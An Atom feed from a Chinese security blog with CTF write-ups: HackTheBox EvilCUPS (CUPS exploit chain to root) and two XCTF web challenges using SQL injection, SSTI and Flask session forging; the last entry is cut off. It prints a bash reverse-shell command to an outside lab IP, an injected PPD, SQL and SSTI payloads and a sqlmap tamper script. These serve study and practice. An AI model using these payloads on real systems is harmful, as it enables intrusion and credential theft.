<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Salve</title>
  
  
  <link href="https://taninluv.github.io/atom.xml" rel="self"/>
  
  <link href="https://taninluv.github.io/"/>
  <updated>2024-10-26T08:30:15.995Z</updated>
  <id>https://taninluv.github.io/</id>
  
  <author>
    <name>TiAmo</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HTB_EvilCUPS</title>
    <link href="https://taninluv.github.io/2024/10/26/HTB-EvilCUPS/"/>
    <id>https://taninluv.github.io/2024/10/26/HTB-EvilCUPS/</id>
    <published>2024-10-26T06:16:05.000Z</published>
    <updated>2024-10-26T08:30:15.995Z</updated>
    
    <content type="html"><![CDATA[<p>参照：<a href="https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html">HTB: EvilCUPS | 0xdf hacks stuff</a></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><pre><code class="bash">└─# nmap  10.10.11.40 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:27 EDTNmap scan report for 10.10.11.40Host is up (0.14s latency).Not shown: 998 closed tcp ports (reset)PORT    STATE SERVICE22/tcp  open  ssh631/tcp open  ippNmap done: 1 IP address (1 host up) scanned in 2.20 seconds                                                                                                                                ┌──(root㉿kali)-[~]└─# nmap -sV -sC -p 22,631 10.10.11.40Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:28 EDTNmap scan report for 10.10.11.40Host is up (0.15s latency).PORT    STATE SERVICE VERSION22/tcp  open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)| ssh-hostkey: |   256 36:49:95:03:8d:b4:4c:6e:a9:25:92:af:3c:9e:06:66 (ECDSA)|_  256 9f:a4:a9:39:11:20:e0:96:ee:c4:9a:69:28:95:0c:60 (ED25519)631/tcp open  ipp     CUPS 2.4| http-robots.txt: 1 disallowed entry |_/|_http-title: Home - CUPS 2.4.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 82.38 seconds</code></pre><p>简单了解一下631端口的CUPS：</p><p><a href="https://www.right.com.cn/forum/thread-8276397-1-1.html">关于使用CUPS共享打印机的正确姿势，你可以永远告别打印驱动了-OPENWRT专版-恩山无线论坛</a></p><blockquote><p><strong>GPT:</strong></p><p>CUPS（Common Unix Printing System）是一个开放源代码的打印系统，主要用于类 Unix 操作系统（如 Linux 和 macOS）。它提供了一个标准的打印服务，使得各种打印机能够通过网络共享和管理。CUPS 采用了客户端-服务器架构，并通过 Internet Printing Protocol (IPP) 进行打印任务的管理。</p><h3 id="CUPS-的主要特点"><a href="#CUPS-的主要特点" class="headerlink" title="CUPS 的主要特点"></a>CUPS 的主要特点</h3><ol><li><strong>跨平台支持</strong>：CUPS 可以在多种操作系统上运行，包括 Linux、macOS、BSD 和 Solaris。</li><li><strong>网络打印</strong>：支持通过网络打印，允许多个客户端连接到打印服务器并共享打印机。</li><li><strong>易于管理</strong>：提供一个 Web 界面（通常在 <code>http://localhost:631</code> 上可访问），使得用户可以方便地配置打印机、管理打印任务和查看打印状态。</li><li><strong>支持多种打印机</strong>：兼容多种类型的打印机，包括本地连接的和网络打印机。</li><li><strong>驱动程序支持</strong>：CUPS 支持多种打印机驱动程序，可以通过 PPD（PostScript Printer Description）文件来管理打印机。</li></ol></blockquote><h1 id="UDP端口"><a href="#UDP端口" class="headerlink" title="UDP端口"></a>UDP端口</h1><p>根据博文，</p><blockquote><p>根据 <a href="https://packages.debian.org/search?keywords=openssh-server">OpenSSH 版本</a>，主机可能正在运行 Debian 12 bookworm。</p><p>看到 CUPS（通用 Unix 打印系统），我也会检查 UDP，它很可能是打开的：</p></blockquote><p>&#x3D;&#x3D;&gt;</p><pre><code class="bash">└─# nmap -sU -p 631 10.10.11.40Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-26 02:36 EDTNmap scan report for 10.10.11.40Host is up (0.14s latency).PORT    STATE         SERVICE631/udp open|filtered ippNmap done: 1 IP address (1 host up) scanned in 1.81 seconds</code></pre><h1 id="CUPS版本"><a href="#CUPS版本" class="headerlink" title="CUPS版本"></a>CUPS版本</h1><p>nmap扫到版本是2.4，提交之后发现不对，访问一下CUPS服务器，发现还有更细微的版本划分：2.4.2</p><blockquote><p>OpenPrinting CUPS 2.4.2</p></blockquote><h1 id="查询漏洞"><a href="#查询漏洞" class="headerlink" title="查询漏洞"></a>查询漏洞</h1><table><thead><tr><th><strong>漏洞编号</strong></th><th><strong>危害描述</strong></th><th><strong>CVSS 3.1****分数</strong></th></tr></thead><tbody><tr><td>CVE-2024-47175</td><td>libppd库中存在输入验证不当漏洞，未经验证的IPP 数据可能被写入临时PPD 文件，导致攻击者注入恶意数据。</td><td><strong>8.6</strong></td></tr><tr><td>CVE-2024-47076</td><td>libcupsfilters库中存在输入验证不当漏洞，攻击者可以发送恶意数据至CUPS 系统</td><td><strong>8.6</strong></td></tr><tr><td>CVE-2024-47177</td><td>cups-filters库中存在命令注入漏洞，攻击者可以通过FoomaticRIPCommandLine PPD参数执行任意命令</td><td><strong>9.1</strong></td></tr></tbody></table><p>根据<a href="https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/">通过 CUPS 攻击 UNIX 系统，第 I 部分</a>：</p><ul><li>CVE-2024-47176 漏洞 |<strong>cups-browsed</strong> &lt;&#x3D; 2.0.1 在 UDP INADDR_ANY：631 上绑定，<code>Get-Printer-Attributes</code>信任来自任何来源的任何数据包，以触发对攻击者控制的 URL 的 IPP 请求。</li><li>CVE-2024-47076 漏洞 |<strong>libcups过滤器</strong> &lt;&#x3D; 2.1b1 <code>cfGetPrinterAttributes5</code>不会验证或清理从 IPP 服务器返回的 IPP 属性，从而向 CUPS 系统的其余部分提供攻击者控制的数据。</li><li>CVE-2024-47175 漏洞 |<strong>libppd</strong> &lt;&#x3D; 2.1b1 <code>ppdCreatePPDFromIPP2</code>在将 IPP 属性写入临时 PPD 文件时不验证或清理 IPP 属性，从而允许在生成的 PPD 中注入攻击者控制的数据。</li><li>CVE-2024-47177 漏洞 |<strong>cups-filters</strong> &lt;&#x3D; 2.0.1 <code>foomatic-rip``FoomaticRIPCommandLine</code>允许通过 PPD 参数执行任意命令。</li></ul><p>使用脚本：<a href="https://github.com/ippsec/evil-cups">IppSec&#x2F;evil-cups</a></p><pre><code>──(myenv)─(root㉿kali)-[~/work/HTB/EvilCUPS/evil-cups]└─# python3 evilcups.py 10.10.16.2 10.10.11.40 &#39;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.2/443 0&gt;&amp;1&quot;&#39;</code></pre><p>本地起一个443端口监听，然后点击脚本上传的打印任务，选择打印测试页即可反弹一个 shell</p><blockquote><p><code>script /dev/null -c bash</code> 是一个命令，用于启动一个新的 Bash shell，但不将输出记录到文件中。这条命令的各部分含义如下：</p><ul><li>**<code>script</code>**：这是一个用于记录终端会话的命令。它可以将所有在终端中输入的内容和输出记录到一个文件中。</li><li>**<code>/dev/null</code>**：这是一个特殊的设备文件，任何写入到这个文件的数据都会被丢弃。将输出重定向到 <code>/dev/null</code> 意味着不会保存输出。</li><li>**<code>-c</code>**：这是 <code>script</code> 命令的一个选项，后面跟着要执行的命令。在这种情况下，命令是 <code>bash</code>。</li><li>**<code>bash</code>**：这是要启动的命令行解释器。</li></ul><h3 id="整体作用"><a href="#整体作用" class="headerlink" title="整体作用"></a>整体作用</h3><p>使用 <code>script /dev/null -c bash</code> 命令可以启动一个新的 Bash shell，且不记录该会话的任何输出。这在需要临时使用 Bash shell，但又不想生成任何记录文件的情况下非常有用。</p></blockquote><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>查看可用用户</p><pre><code> cat /etc/passwd | grep &quot;sh$&quot;</code></pre><p>根据<a href="https://www.cups.org/doc/spec-design.html">CUPS 设计说明</a>:</p><blockquote><h4 id="作业文件"><a href="#作业文件" class="headerlink" title="作业文件"></a>作业文件</h4><p>调度程序将作业文件存储在 <em>spool 目录中</em>，通常为<code>/var/spool/cups</code> 。在假脱机目录中可以找到两种类型的文件：以字母 “c” 开头的<em>控制文件</em> （“c00001”， “c99999”， “c100000” 等） 和以字母 “d” 开头<em>的数据文件</em> （“d00001-001”、“d99999-001”、“d100000-001” 等）控制文件是基于原始 IPP 打印作业或创建作业消息的 IPP 消息，而数据文件是提交进行打印的原始打印文件。系统已知的每个作业都有一个控制文件，每个作业有 0 个或多个数据文件。</p></blockquote><p>以及：</p><blockquote><p>GPT:</p><p>如果你不是文件夹的所有者，且文件夹的权限设置为禁止其他用户列出内容（如 <code>r-x</code>），你将无法使用 <code>ls</code> 命令查看其内容，但仍可以访问特定的文件（如果你知道它们的路径并且有权限）。</p></blockquote><p>这里无法直接ls出<code>/var/spool/cups</code>下的作业文件，但是根据作业文件的命名规则，尝试猜测数据文件名，在这个服务器上只打印了一个文件，此时猜测他的数据文件名为<code>d00001-001</code>,直接cat果然可以，把文件内容复制下来到本地，如何使用呢？</p><h2 id="ps2pdf"><a href="#ps2pdf" class="headerlink" title="ps2pdf"></a>ps2pdf</h2><blockquote><p>GPT:</p><p><code>ps2pdf</code> 是一个命令行工具，用于将 PostScript 文件转换为 PDF 文件。它是 Ghostscript 工具集的一部分，通常用于处理和转换图形文件。</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>基本的命令格式如下：</p><pre><code>bash复制代码ps2pdf input.ps output.pdf</code></pre><ul><li>**<code>input.ps</code>**：要转换的 PostScript 文件。</li><li>**<code>output.pdf</code>**：转换后生成的 PDF 文件。</li></ul><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>如果你有一个名为 <code>document.ps</code> 的 PostScript 文件，并希望将其转换为 <code>document.pdf</code>，你可以运行以下命令：</p><pre><code>bash复制代码ps2pdf document.ps document.pdf</code></pre><h3 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h3><p><code>ps2pdf</code> 提供了一些可选参数，可以在转换时调整输出 PDF 的质量和其他设置。例如：</p><ul><li>**<code>-dPDFSETTINGS=</code>**：设置 PDF 输出的质量，例如 <code>screen</code>、<code>ebook</code>、<code>printer</code>、<code>prepress</code> 等。</li><li>**<code>-dCompatibilityLevel=</code>**：设置生成 PDF 的版本。</li></ul><p>示例：</p><pre><code>bash复制代码ps2pdf -dPDFSETTINGS=/ebook input.ps output.pdf</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>ps2pdf</code> 是一个非常有用的工具，可以轻松地将 PostScript 文件转换为 PDF 文件，适用于需要将打印文件格式转换为可分发和可阅读格式的情况</p></blockquote><p>这里可以用这个工具把数据转换为pdf，打开可以看到：</p><blockquote><p>pass.txt Sat Sep 28 09:30:10 2024   1 </p><p>Br3@k-G!@ss-r00t-evilcups</p></blockquote><p>这里就得到了管理员密码</p><h1 id="维持"><a href="#维持" class="headerlink" title="维持"></a>维持</h1><p>后部分博文还看不懂，抄一个在这里：</p><p>当我以这种方式创建打印机时，它会通过 IPP 访问给定的 URL。生成的属性将另存为文件，该文件位于 以打印机名称命名：<code>cups-browsed``.ppd``/etc/cups/ppd</code></p><pre><code>root@evilcups:/etc/cups/ppd# lsHACKED_10_10_14_6.ppdroot@evilcups:/etc/cups/ppd# cat HACKED_10_10_14_6.ppd*PPD-Adobe: &quot;4.3&quot;*APRemoteQueueID: &quot;&quot;*FormatVersion: &quot;4.3&quot;*FileVersion: &quot;1.28.17&quot;*LanguageVersion: English*LanguageEncoding: ISOLatin1*PSVersion: &quot;(3010.000) 0&quot;*LanguageLevel: &quot;3&quot;*FileSystem: False*PCFileName: &quot;drvless.ppd&quot;*Manufacturer: &quot;HP&quot;*ModelName: &quot;HP 0.00&quot;*Product: &quot;(HP 0.00)&quot;*NickName: &quot;HP 0.00, driverless, cups-filters 1.28.17&quot;*ShortNickName: &quot;HP 0.00&quot;*DefaultOutputOrder: Normal*ColorDevice: True*cupsVersion: 2.4*cupsSNMPSupplies: False*cupsLanguages: &quot;en&quot;*APSupplies: &quot;&quot;*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&quot;*cupsFilter2: &quot;application/vnd.cups-pdf application/pdf 200 -&quot;*% Printer did not supply page size info via IPP, using defaults*OpenUI *PageSize/Media Size: PickOne*OrderDependency: 10 AnySetup *PageSize*DefaultPageSize: Letter*PageSize Letter/US Letter: &quot;&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice&quot;*PageSize Legal/US Legal: &quot;&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice&quot;*PageSize Executive/Executive: &quot;&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice&quot;*PageSize Tabloid/Tabloid: &quot;&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice&quot;*PageSize A3/A3: &quot;&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice&quot;*PageSize A4/A4: &quot;&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice&quot;*PageSize A5/A5: &quot;&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice&quot;*PageSize B5/JIS B5: &quot;&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice&quot;*PageSize EnvISOB5/Envelope B5: &quot;&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice&quot;*PageSize Env10/Envelope #10 : &quot;&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice&quot;*PageSize EnvC5/Envelope C5: &quot;&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice&quot;*PageSize EnvDL/Envelope DL: &quot;&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice&quot;*PageSize EnvMonarch/Envelope Monarch: &quot;&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice&quot;*CloseUI: *PageSize*OpenUI *PageRegion/Media Size: PickOne*OrderDependency: 10 AnySetup *PageRegion*DefaultPageRegion: Letter*PageRegion Letter/US Letter: &quot;&lt;&lt;/PageSize[612 792]&gt;&gt;setpagedevice&quot;*PageRegion Legal/US Legal: &quot;&lt;&lt;/PageSize[612 1008]&gt;&gt;setpagedevice&quot;*PageRegion Executive/Executive: &quot;&lt;&lt;/PageSize[522 756]&gt;&gt;setpagedevice&quot;*PageRegion Tabloid/Tabloid: &quot;&lt;&lt;/PageSize[792 1224]&gt;&gt;setpagedevice&quot;*PageRegion A3/A3: &quot;&lt;&lt;/PageSize[842 1191]&gt;&gt;setpagedevice&quot;*PageRegion A4/A4: &quot;&lt;&lt;/PageSize[595 842]&gt;&gt;setpagedevice&quot;*PageRegion A5/A5: &quot;&lt;&lt;/PageSize[420 595]&gt;&gt;setpagedevice&quot;*PageRegion B5/JIS B5: &quot;&lt;&lt;/PageSize[516 729]&gt;&gt;setpagedevice&quot;*PageRegion EnvISOB5/Envelope B5: &quot;&lt;&lt;/PageSize[499 709]&gt;&gt;setpagedevice&quot;*PageRegion Env10/Envelope #10 : &quot;&lt;&lt;/PageSize[297 684]&gt;&gt;setpagedevice&quot;*PageRegion EnvC5/Envelope C5: &quot;&lt;&lt;/PageSize[459 649]&gt;&gt;setpagedevice&quot;*PageRegion EnvDL/Envelope DL: &quot;&lt;&lt;/PageSize[312 624]&gt;&gt;setpagedevice&quot;*PageRegion EnvMonarch/Envelope Monarch: &quot;&lt;&lt;/PageSize[279 540]&gt;&gt;setpagedevice&quot;*CloseUI: *PageSize*DefaultImageableArea: Letter*ImageableArea Letter/US Letter: &quot;18 12 594 780&quot;*ImageableArea Legal/US Legal: &quot;18 12 594 996&quot;*ImageableArea Executive/Executive: &quot;18 12 504 744&quot;*ImageableArea Tabloid/Tabloid: &quot;18 12 774 1212&quot;*ImageableArea A3/A3: &quot;18 12 824 1179&quot;*ImageableArea A4/A4: &quot;18 12 577 830&quot;*ImageableArea A5/A5: &quot;18 12 402 583&quot;*ImageableArea B5/JIS B5: &quot;18 12 498 717&quot;*ImageableArea EnvISOB5/Envelope B5: &quot;18 12 481 697&quot;*ImageableArea Env10/Envelope #10 : &quot;18 12 279 672&quot;*ImageableArea EnvC5/Envelope C5: &quot;18 12 441 637&quot;*ImageableArea EnvDL/Envelope DL: &quot;18 12 294 612&quot;*ImageableArea EnvMonarch/Envelope Monarch: &quot;18 12 261 528&quot;*DefaultPaperDimension: Letter*PaperDimension Letter/US Letter: &quot;612 792&quot;*PaperDimension Legal/US Legal: &quot;612 1008&quot;*PaperDimension Executive/Executive: &quot;522 756&quot;*PaperDimension Tabloid/Tabloid: &quot;792 1224&quot;*PaperDimension A3/A3: &quot;842 1191&quot;*PaperDimension A4/A4: &quot;595 842&quot;*PaperDimension A5/A5: &quot;420 595&quot;*PaperDimension B5/JIS B5: &quot;516 729&quot;*PaperDimension EnvISOB5/Envelope B5: &quot;499 709&quot;*PaperDimension Env10/Envelope #10 : &quot;297 684&quot;*PaperDimension EnvC5/Envelope C5: &quot;459 649&quot;*PaperDimension EnvDL/Envelope DL: &quot;312 624&quot;*PaperDimension EnvMonarch/Envelope Monarch: &quot;279 540&quot;*OpenUI *ColorModel/Print Color Mode: PickOne*OrderDependency: 10 AnySetup *ColorModel*DefaultColorModel: Gray*ColorModel FastGray/Fast Grayscale: &quot;&lt;&lt;/cupsColorSpace 3/cupsBitsPerColor 1/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice&quot;*ColorModel Gray/Grayscale: &quot;&lt;&lt;/cupsColorSpace 18/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceGray&gt;&gt;setpagedevice&quot;*ColorModel RGB/Color: &quot;&lt;&lt;/cupsColorSpace 19/cupsBitsPerColor 8/cupsColorOrder 0/cupsCompression 0/ProcessColorModel /DeviceRGB&gt;&gt;setpagedevice&quot;*CloseUI: *ColorModel*OpenUI *Duplex/2-Sided Printing: PickOne*OrderDependency: 10 AnySetup *Duplex*DefaultDuplex: None*Duplex None/Off: &quot;&lt;&lt;/Duplex false&gt;&gt;setpagedevice&quot;*Duplex DuplexNoTumble/On (Portrait): &quot;&lt;&lt;/Duplex true/Tumble false&gt;&gt;setpagedevice&quot;*Duplex DuplexTumble/On (Landscape): &quot;&lt;&lt;/Duplex true/Tumble true&gt;&gt;setpagedevice&quot;*CloseUI: *Duplex*DefaultResolution: 300dpi*cupsFilter2: &quot;application/vnd.cups-pdf application/pdf 0 -&quot;</code></pre><p>重要的一行是：</p><pre><code>*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;</code></pre><p>当它打印时，它将运行我的反向 shell。</p><p>在它的正上方，有一个空参数：</p><pre><code>*APSupplies: &quot;&quot;*FoomaticRIPCommandLine: &quot;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.6/443 0&gt;&amp;1&quot;&quot;</code></pre><p>这可能是来自我<a href="https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html#poc-analysis">上面</a>提到的换行符注入：</p><pre><code>                SectionEnum.printer,                b&#39;printer-more-info&#39;,                TagEnum.uri            ): [f&#39;&quot;\n*FoomaticRIPCommandLine: &quot;&#123;self.command&#125;&quot;\n*cupsFilter2 : &quot;application/pdf application/vnd.cups-postscript 0 foomatic-rip&#39;.encode()],printer-more-info`必须转换为文件中的属性，然后新行开始 .`APSupplies``.ppd``FoomaticRIPCommandLine</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参照：&lt;a href=&quot;https://0xdf.gitlab.io/2024/10/02/htb-evilcups.html&quot;&gt;HTB: EvilCUPS | 0xdf hacks stuff&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;端口扫描&quot;&gt;&lt;a href=&quot;#端口扫描&quot; c</summary>
      
    
    
    
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
    <category term="Printer" scheme="https://taninluv.github.io/tags/Printer/"/>
    
    <category term="CVE-2024-47176" scheme="https://taninluv.github.io/tags/CVE-2024-47176/"/>
    
  </entry>
  
  <entry>
    <title>XCTF_email</title>
    <link href="https://taninluv.github.io/2024/09/25/XCTF-email/"/>
    <id>https://taninluv.github.io/2024/09/25/XCTF-email/</id>
    <published>2024-09-25T08:34:39.000Z</published>
    <updated>2024-09-27T09:30:01.389Z</updated>
    
    <content type="html"><![CDATA[<p>打开页面，还是登录注册，随便注册一个账号，并扫描一下路径。登录之后发现所有信息都放在这里：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925165730881.png" alt="image-20240925165730881"></p><p>考虑一下有没有注入，发现username和mail都没有，抓包cookie里发现jwt：<img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925170029704.png" alt="image-20240925170029704"></p><p>&#x3D;&#x3D;》</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240925170128637.png" alt="image-20240925170128637"></p><p>在 <code>jwt.io</code> 中生成的 JWT 使用的是特定的算法（如 HMAC SHA256），并且可以设置特定的密钥和有效载荷。Flask 的 <code>session</code> 默认使用 Flask 内部的签名机制，可能不会以 JWT 格式生成，具体实现可能与 JWT 的结构和内容不同。因此直接使用 <code>jwt.io</code>一般无法直接生成session</p><p>源码也没有发现东西，路径扫描得到<code>/flag</code>路径，访问：</p><blockquote><p>if session[‘isadmin’]: return flag </p></blockquote><p>需要session设置<code>isadmin</code>，那现在需要找到secretkey，因为是flask，应该要通过ssti找config，但是username和mail也不能ssti，测试一下注册页面有无注入，发现注册页面的mail可以sql：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926150529877.png" alt="image-20240926150529877"></p><p>因为没有回显位置，只能试试bool注入：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926160826045.png" alt="image-20240926160826045"></p><p>使用payload</p><pre><code>water3@666.com&#39; AND &#39;c&#39;&gt;&#39;b&#39; AND &#39;ckJV&#39;=&#39;ckJV</code></pre><p>此时返回已经注册：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926165652896.png" alt="image-20240926165652896"></p><p>使用payload</p><pre><code>water3@666.com&#39; AND &#39;a&#39;&gt;&#39;b&#39; AND &#39;ckJV&#39;=&#39;ckJV</code></pre><p>返回注册成功：<img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926165804748.png" alt="image-20240926165804748"></p><p>后台逻辑应该是判断数据库中是否有相同的名字或者邮件，如果有（<code>true</code>）则返回已经注册，否则可以进入一下步判定，因此每次发包使用固定的<code>mail＋payload</code>，然后使用不同的<code>username</code>,这里需要写一个tamper使用sqlmap：</p><p>tamper.py(参照官方wp，由于新版本不支持urllib.quote()，需要从urllib.parse导入:</p><pre><code>import reimport stringimport randomfrom urllib.parse import quotefrom lib.core.data import kbfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.NORMALdef dependencies():    passdef tamper(payload, **kwargs):    headers = kwargs.get(&quot;headers&quot;,&#123;&#125;)    headers[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;    ran_str = &#39;&#39;.join(random.sample(string.ascii_letters + string.digits, 12))    raw_data = &quot;username=&#123;&#125;&amp;passwd=aiyo&amp;mail=&quot;    new_payload = quote(&#39;aiyo@qq.com&#39;+payload)    return raw_data.format(ran_str) + new_payload</code></pre><p>在 sqlmap 的 <code>tamper</code> 脚本目录中需要有一个空的 <code>__init__.py</code> 文件以便 Python 将该目录识别为一个包，从而允许从该目录导入脚本。然后就可以使用sqlmap了：</p><pre><code> sqlmap -r target.txt --tamper ~/work/sqlmap/tamper.py --technique=B --skip-urlencode --string &#39;Already Registered&#39; -D SQLite -T users -C username --dump --proxy=&quot;http://127.0.0.1:8080&quot;</code></pre><p>这里，代理到bp以便学习一下payload，他这里用<code>&#39;ckJV&#39;=&#39;ckJV</code>作为结尾闭合自动添加在末尾的<code>&#39;</code>，学到了。</p><p><code>--string</code>指定代表注入成功的字符串，在tamper中我们已经编码了payload防止sqlmap双重编码，因此<code>--skip-urlencode</code></p><p>最后注入的到用户名<code>admin</code>和密码<code>h4ck4fun </code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240926173424634.png" alt="image-20240926173424634"></p><p>此时发现多了一个邮箱修改功能：</p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927104659788.png" alt="image-20240927104659788"></p><p>由于邮箱会显示在主页，我们考虑应该在这里有ssti：<code>&#123;2*3&#125;</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927105125365.png" alt="image-20240927105125365"></p><p>ssti学完之后手工做的不多，这里忘得差不多了，想不起来怎么找继承链（本来也不太会），这里使用<code>&#123;user.__class__.__init__.__globals__[current_app].config&#125;</code></p><p><img src="C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20240927105738898.png" alt="image-20240927105738898"></p><p>得到secret key：<code>d327b7e36b7845956bf8db4de198437a</code></p><p>此时借助工具<a href="https://github.com/noraj/flask-session-cookie-manager">GitHub - noraj&#x2F;flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder&#x2F;Encoder</a>可以制作一个cookie-session去访问&#x2F;flag：</p><pre><code>./flask_session_cookie_manager3.py encode -s &#39;&#123;secret_key&#125;&#39; -t &quot;&#123;&#39;isadmin&#39;: 1, &#39;user&#39;: (1, &#39;admin&#39;, &#39;water3@666.com&#39;)&#125;&quot;</code></pre><p>使用生成的cookie访问即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;打开页面，还是登录注册，随便注册一个账号，并扫描一下路径。登录之后发现所有信息都放在这里：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;C:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-202</summary>
      
    
    
    
    
    <category term="xctf" scheme="https://taninluv.github.io/tags/xctf/"/>
    
    <category term="ssti" scheme="https://taninluv.github.io/tags/ssti/"/>
    
    <category term="sqlmap" scheme="https://taninluv.github.io/tags/sqlmap/"/>
    
  </entry>
  
  <entry>
    <title>XCTF_easylaravel</title>
    <link href="https://taninluv.github.io/2024/09/18/XCTF-easylaravel/"/>
    <id>https://taninluv.github.io/2024/09/18/XCTF-easylaravel/</id>
    <published>2024-09-18T02:26:38.000Z</published>
    <updated>2024-09-25T08:33:29.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XCTF-easylaravel"><a href="#XCTF-easylaravel" class="headerlink" title="XCTF_easylaravel"></a>XCTF_easylaravel</h1><p>首先关于Laravel：<a href="https://laravel.com/docs/5.4/passwords">重置密码 - Laravel 5.4 - Web Artisans 的 PHP 框架</a></p><p>先登录网站，登录注册什么的功能都有，扫描目录的时候看一下网页代码，发现是个代码审计题：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322842.png" alt="image-20240919173106932"></p><p>后续路径扫描找到了一个upload，但是没什么用上不去。</p><p>下载源码看一下，发现有<code>composer.json</code>，于是<code>composer install</code>一下</p><p>看一下路由：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322843.png" alt="image-20240920144548472"></p><p>发现有一个flag路由，跟进一下</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322844.png" alt="image-20240920144659024"></p><p>发现使用了中间件，一个是要身份验证，还有一个应该是要管理员身份才能拿到flag，那看一下中间件怎么控制的。</p><p>没直接找到名字为admin的中间件，在<code>Kernel.php</code>看一下注册的名字关联：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322845.png" alt="image-20240921102453222"></p><p>查看这个中间件代码,发现需要账户的邮箱为指定的管理员邮箱：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322846.png" alt="image-20240921102536398"></p><p>看一下用户注册的代码<code>RegisterController.php</code>,邮箱无法重复使用：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322848.png" alt="image-20240921103133065"></p><p>看一下密码重置：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322849.png" alt="image-20240921103358206"></p><p>使用的是原生的重置方法，去官方文档看一下：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322850.png" alt="image-20240921105803513"></p><p>如果配置了密码重置自定义过程会配置代理，看一下有没有代理，全局搜索发现有<code>easy_laravel-master\vendor\laravel\framework\src\Illuminate\Auth\Passwords\PasswordBroker.php</code>：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322851.png" alt="image-20240921110901655"></p><p>发送重置连接会创建一个token，根据官方文档，提供了储存token的数据库：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322852.png" alt="image-20240921111104470"></p><p>&#x3D;&#x3D;》</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322853.png" alt="image-20240921111146391"></p><p>得到了表名和列名，需要找一下有无sql注入，网页比较少我们只看了flag的控制器，看一下剩下的：（这里其实普通用户登录后只有一个note界面也能联想到看note的控制器和渲染页面）</p><p>发先note里真有sql：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202409211322854.png" 